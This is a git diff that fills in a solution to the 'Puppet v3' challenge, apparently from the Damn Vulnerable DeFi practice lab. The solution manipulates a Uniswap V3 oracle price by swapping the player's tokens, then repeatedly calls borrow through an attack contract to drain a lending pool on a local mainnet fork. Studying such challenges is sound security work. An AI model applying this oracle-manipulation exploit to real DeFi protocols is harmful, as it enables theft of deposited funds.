@@ -1,6 +1,15 @@
+// Note: Remember to set the FORK_URL environment variable before running the test
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { time, setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+
+const {
+    setDefaultSigner,
+    setTracerTag,
+    setTracerArtifactName,
+    callContract,
+    deployContract,
+} = require("../common/utils.js");
 
 const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/NonfungiblePositionManager.sol/NonfungiblePositionManager.json");
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
@@ -26,7 +35,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = process.env.FORK_URL;
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -49,20 +58,27 @@ describe('[Challenge] Puppet v3', function () {
         // Initialize player account
         // using private key of account #2 in Hardhat's node
         player = new ethers.Wallet("0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d", ethers.provider);
+        setTracerTag(player.address, "Player");
         await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.eq(PLAYER_INITIAL_ETH_BALANCE);
 
         // Initialize deployer account
         // using private key of account #1 in Hardhat's node
         deployer = new ethers.Wallet("0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80", ethers.provider);
+        setTracerTag(deployer.address, "Deployer");
         await setBalance(deployer.address, DEPLOYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(deployer.address)).to.eq(DEPLOYER_INITIAL_ETH_BALANCE);
 
         // Get a reference to the Uniswap V3 Factory contract
         uniswapFactory = new ethers.Contract("0x1F98431c8aD98523631AE4a59f267346ea31F984", factoryJson.abi, deployer);
+        await setTracerArtifactName(
+            uniswapFactory.address,
+            "@uniswap/v3-core/contracts/UniswapV3Factory.sol:UniswapV3Factory"
+        );
 
         // Get a reference to WETH9
         weth = (await ethers.getContractFactory('WETH', deployer)).attach("0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2");
+        await setTracerArtifactName(weth.address, "solmate/src/tokens/WETH.sol:WETH");
 
         // Deployer wraps ETH in WETH
         await weth.deposit({ value: UNISWAP_INITIAL_WETH_LIQUIDITY });
@@ -70,9 +86,13 @@ describe('[Challenge] Puppet v3', function () {
 
         // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        
+
         // Create the Uniswap v3 pool
         uniswapPositionManager = new ethers.Contract("0xC36442b4a4522E871399CD717aBDD847Ab11FE88", positionManagerJson.abi, deployer);
+        await setTracerArtifactName(
+            uniswapPositionManager.address,
+            "@uniswap/v3-periphery/contracts/NonfungiblePositionManager.sol:NonfungiblePositionManager"
+        );
         const FEE = 3000; // 0.3%
         await uniswapPositionManager.createAndInitializePoolIfNecessary(
             weth.address,  // token0
@@ -87,9 +107,13 @@ describe('[Challenge] Puppet v3', function () {
             token.address,
             FEE
         );
+        await setTracerArtifactName(
+            uniswapPoolAddress,
+            "@uniswap/v3-core/contracts/UniswapV3Pool.sol:UniswapV3Pool"
+        );
         uniswapPool = new ethers.Contract(uniswapPoolAddress, poolJson.abi, deployer);
         await uniswapPool.increaseObservationCardinalityNext(40);
-        
+
         // Deployer adds liquidity at current price to Uniswap V3 exchange
         await weth.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
         await token.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
@@ -105,7 +129,7 @@ describe('[Challenge] Puppet v3', function () {
             amount0Min: 0,
             amount1Min: 0,
             deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
-        }, { gasLimit: 5000000 });        
+        }, { gasLimit: 5000000 });
 
         // Deploy the lending pool
         lendingPool = await (await ethers.getContractFactory('PuppetV3Pool', deployer)).deploy(
@@ -140,6 +164,58 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // VULNERABILITY: Price manipulation again. But in Uniswap V3, price observation is recorded
+        // per-block, so we have to wait enough blocks until our manipulation takes effects.
+
+        const getBalances = async () => {
+            for (let entity of [player, lendingPool, uniswapPool, attackContract]) {
+                let entityName =
+                    entity.address === player.address ? "Player" :
+                        entity.address === lendingPool.address ? "LendingPool" :
+                            entity.address === attackContract.address ? "AttackContract" :
+                                "UniswapPool";
+                let dvtBalance = ethers.utils.formatEther(await token.balanceOf(entity.address));
+                let ethBalance = ethers.utils.formatEther(await weth.balanceOf(entity.address));
+                console.log(`  ${entityName}: ${dvtBalance} DVT, ${ethBalance} WETH`);
+            }
+            let collat = await callContract(
+                lendingPool,
+                "calculateDepositOfWETHRequired",
+                [token.balanceOf(lendingPool.address)]
+            );
+            console.log(`  Pool Value (3x): ${ethers.utils.formatEther(collat)} WETH`);
+        };
+
+        console.log("\n=== Exploit Begin ===\n");
+
+        setDefaultSigner(player);
+
+        let attackContract = await deployContract(
+            "PuppetV3Attack",
+            [weth.address, token.address, uniswapPool.address, lendingPool.address],
+        );
+
+        console.log("\nInitial balances:");
+        await getBalances();
+
+        // deposit all DVT to tilt the uniswap pool
+        await callContract(token, "approve", [attackContract.address, PLAYER_INITIAL_TOKEN_BALANCE]);
+        await callContract(attackContract, "swap", [PLAYER_INITIAL_TOKEN_BALANCE]);
+
+        console.log("\nBalances after swap:");
+        await getBalances();
+
+        // mine a few blocks to make the price change take effect
+        for (let i = 0; i < 115; i++) {
+            let tx = await callContract(attackContract, "borrow");
+            if (tx.logs.length > 0)
+                break;
+        }
+
+        console.log("\nFinal balances:");
+        await getBalances();
+
+        console.log("\n=== Exploit End ===\n");
     });
 
     after(async function () {
@@ -150,7 +226,7 @@ describe('[Challenge] Puppet v3', function () {
             (await ethers.provider.getBlock('latest')).timestamp - initialBlockTimestamp
         ).to.be.lt(115, 'Too much time passed');
 
-        // Player has taken all tokens out of the pool        
+        // Player has taken all tokens out of the pool
         expect(
             await token.balanceOf(lendingPool.address)
         ).to.be.eq(0);
